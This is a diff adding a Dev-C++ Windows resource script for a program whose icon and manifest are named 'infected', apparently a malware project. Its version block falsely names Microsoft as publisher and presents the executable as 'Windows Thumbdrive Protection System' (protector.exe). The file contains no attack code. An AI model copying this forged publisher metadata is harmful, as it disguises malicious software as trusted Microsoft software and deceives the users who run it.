@@ -1,0 +1,44 @@
+/* THIS FILE WILL BE OVERWRITTEN BY DEV-C++ */
+/* DO NOT EDIT! */
+
+#include <windows.h> // include for version info constants
+
+
+A ICON MOVEABLE PURE LOADONCALL DISCARDABLE "infected.ico"
+
+//
+// SUPPORT FOR WINDOWS XP THEMES:
+// THIS WILL MAKE THE PROGRAM USE THE COMMON CONTROLS
+// LIBRARY VERSION 6.0 (IF IT IS AVAILABLE)
+//
+1 24 "infected.exe.Manifest"
+
+//
+// TO CHANGE VERSION INFORMATION, EDIT PROJECT OPTIONS...
+//
+1 VERSIONINFO
+FILEVERSION 1,1,3,9
+PRODUCTVERSION 1,1,3,9
+FILETYPE VFT_APP
+{
+  BLOCK "StringFileInfo"
+	 {
+		 BLOCK "040904E4"
+		 {
+			 VALUE "CompanyName", "Microsoft"
+			 VALUE "FileVersion", "1.1"
+			 VALUE "FileDescription", "Windows Thumbdrive Protection System"
+			 VALUE "InternalName", "protector.exe"
+			 VALUE "LegalCopyright", "Copyright 2006 Microsoft"
+			 VALUE "LegalTrademarks", ""
+			 VALUE "OriginalFilename", "protector.exe"
+			 VALUE "ProductName", "Protector"
+			 VALUE "ProductVersion", "1.1"
+		 }
+	 }
+  BLOCK "VarFileInfo"
+	 {
+		 VALUE "Translation", 0x0409, 1252
+	 }
+}
+
